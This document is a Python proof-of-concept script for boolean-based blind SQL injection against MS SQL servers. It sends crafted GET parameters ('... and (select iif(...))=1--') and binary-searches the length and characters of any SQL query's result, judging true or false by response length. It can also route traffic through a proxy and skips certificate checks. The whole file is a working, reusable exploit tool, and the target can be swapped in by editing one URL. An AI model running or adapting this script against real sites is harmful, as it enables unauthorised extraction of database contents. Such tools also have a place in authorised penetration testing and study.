################################################################################################
#  Description:  
#  A rough HTTP GET based POC for dumping results from an MS SQL database 
#  using boolean based SQL injection. 
#  Requirements: Python 2.7, requests
#  Author: b0yd
#
################################################################################################

import requests
import urllib
import time
import math
import sys

proxies = None
#Comment out if not using a proxy like Burp, etc
#proxies = {
# 'http': 'http://127.0.0.1:8080',
# 'https': 'http://127.0.0.1:8080',
#}

#Example User Agent string
headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
           'Content-Type':'application/x-www-form-urlencoded'}
    
#Set to bypass errors if the target site has SSL issues
requests.packages.urllib3.disable_warnings()

#Set this to the parameter name for the POST request
vuln_param_name = "Name"

#Target URL
url = "https://example.com"

#Set this to the beginning ascii ordinal value
begin_num = 20
#Set this to the end ascii ordinal value
end_num = 127

#Used to find the length of the returned SQL string
def get_str_length(query, start_ord, end_ord):

    s = start_ord
    e = end_ord 
    res_len = 0
    mid = 0

    #Update mid point
    while True:
        diff = e - s
        if s == end_ord:
            print ("[-] Length not found. Exiting")
            res_len = 0
            break
        elif diff == 0:
            res_len = s
            break
              
        #Set mid point 
        mid = int(math.floor(diff/2)) + s    
        #print "[+] Current ret query length: %d" % mid
        data = "' and (select iif((len((%s))>%d),1,2))=1--" % (query, mid)
        ret = make_request(url, data)
        if ret == None:
            return None
        
        #Query succeeded
        resp_len = len(ret.content)
        #print("[*] Response Length: %d" % resp_len)
        if resp_len > 4000 + len(query):
            #Move the range past the mid point
            s = mid + 1        
        else:   
            #Move the range past to mid point
            e = mid

    return res_len


def make_request( addr, data ):      
        
    #add post data
    param_dict = {vuln_param_name : data}
    retry = 0
    r = None

    while True:
        #Send request
        try:
            r = requests.get(addr, params = param_dict, proxies=proxies, verify=False, headers=headers)
            break
        except Exception as e:
            #print(e)
            retry += 1
            if retry > 5:
                print("[-] Unable to connect to server")
                break
            time.sleep(1 + retry)
        
    return r

def get_string(str_len, query, start_ord, end_ord):

    full_str = ''
    counter = 1
    while( len(full_str) < str_len ):

        s = start_ord
        e = end_ord 
        letter_found = False
        mid = 0
    
        while True:
        
            #Update mid point
            diff = e - s
            if s == end_ord:
                print ("[-] Letter not found. Exiting")
                break
            elif diff == 0:
                full_str += chr(s)
                counter += 1
                letter_found = True
                break  

            #Set mid point 
            mid = int(math.floor(diff/2)) + s    
            #print "[+] Current ASCII char: %d" % mid
            if mid == start_ord:
                print ("[-] Letter not found. Exiting")
                break

            #Construct query
            data = "' and (select iif((ascii(SUBSTRING((%s),%s,1))>%d),1,2))=1--" % (query, counter, mid)
            ret = make_request(url, data) 
            if ret == None:
                break


            #Query succeeded
            resp_len = len(ret.content)
            #print("[*] Response Length: %d" % resp_len)
            if resp_len > 4000 + len(query):
                #if success_str in ret:
                #Move the range past the mid point
                s = mid + 1     
                #print("[+] True case")        
            else:   
                #Move the range past to mid point
                e = mid
                #print("[+] False case") 
            
        print (full_str)
        #sys.exit(1)


        if letter_found == False:
            print ("[-] Letter not found. Exiting")
            break

    return full_str
    

#SQL query to execute
query = "DB_NAME()"

if len(sys.argv) > 1:
  query = sys.argv[1]
  
#Print the query
print ("[+] Running query: '%s'" % query)

stime = time.time()

#Get result string length
str_len = get_str_length(query, 0, 500)

print ("[+] Length: %d" % str_len)
if str_len > 0:
    user = get_string(str_len, query, begin_num, end_num)
    etime = time.time()
    print ("[+] Result: %s" % user)
    print ("[+] Total Time: %d seconds" % (etime-stime))

    
 
